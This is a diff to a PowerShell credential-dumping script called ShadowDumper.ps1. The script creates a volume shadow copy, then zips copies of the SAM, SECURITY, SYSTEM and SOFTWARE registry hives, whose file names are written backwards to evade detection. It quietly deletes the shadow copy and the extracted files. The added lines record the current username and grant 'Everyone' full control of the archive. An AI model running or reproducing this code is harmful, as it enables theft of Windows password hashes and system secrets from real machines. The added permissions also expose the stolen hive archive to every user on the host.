@@ -7,7 +7,8 @@
     Usage: .\ShadowDumper.ps1
 #>
 
-# Set output path
+# Get current user
+$actualUser = $env:USERNAME
 $outputPath = "C:\Windows\Tasks"
 
 Write-Output "[+] Creating shadow copy"
@@ -51,6 +52,13 @@ vssadmin delete shadows /Shadow="$shadowCopyID" /Quiet > $null 2>&1
 # Compress files into a ZIP archive
 Write-Output "[+] Creating ZIP archive: $zipFilePath"
 Compress-Archive -Path "$outputPath\${timestamp}_mas", "$outputPath\${timestamp}_ytiruces", "$outputPath\${timestamp}_metsys", "$outputPath\${timestamp}_erawtfos" -DestinationPath $zipFilePath
+
+# Modify permissions to make the ZIP file readable by everyone
+Write-Output "[+] Modifying ZIP file permissions"
+$acl = Get-Acl $zipFilePath
+$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")
+$acl.SetAccessRule($accessRule)
+Set-Acl -Path $zipFilePath -AclObject $acl
 
 # Remove original files
 Write-Output "[-] Removing extracted files"
